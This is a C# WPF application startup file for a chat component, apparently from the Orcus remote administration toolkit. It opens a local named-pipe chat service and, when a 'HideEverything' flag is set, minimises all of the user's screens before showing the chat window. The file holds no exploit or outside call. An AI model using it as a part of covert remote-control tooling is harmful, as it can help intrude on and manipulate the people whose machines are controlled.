using System;
using System.ServiceModel;
using System.Threading;
using System.Windows;
using Orcus.Chat.Modern.Core;
using Orcus.Chat.Modern.Utilities;
using Orcus.Commands.TextChat;

namespace Orcus.Chat.Modern
{
    /// <summary>
    ///     Interaction logic for App.xaml
    /// </summary>
    public partial class App
    {
        private ServiceHost _host;

        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            _host = new ServiceHost(
                typeof (ChatService), new Uri("net.pipe://localhost/aea9404c4c3542e08537409985536be0"));
            _host.AddServiceEndpoint(typeof (IChatClient),
                new NetNamedPipeBinding
                {
                    MaxBufferSize = 1048576,
                    MaxBufferPoolSize = 1048576,
                    MaxReceivedMessageSize = 1048576
                },
                "OrcusChatService");
            _host.Open();

            ChatService.Initialized += Instance_Initialized;
        }

        private void Instance_Initialized(object sender, EventArgs e)
        {
            var chatService = (ChatService) sender;
            if (chatService.HideEverything)
            {
                Computer.MinimizeAllScreens();
                Thread.Sleep(1000);
            }

            new MainWindow(chatService).Show();
        }

        protected override void OnSessionEnding(SessionEndingCancelEventArgs e)
        {
            base.OnSessionEnding(e);
            _host.Close();
        }
    }
}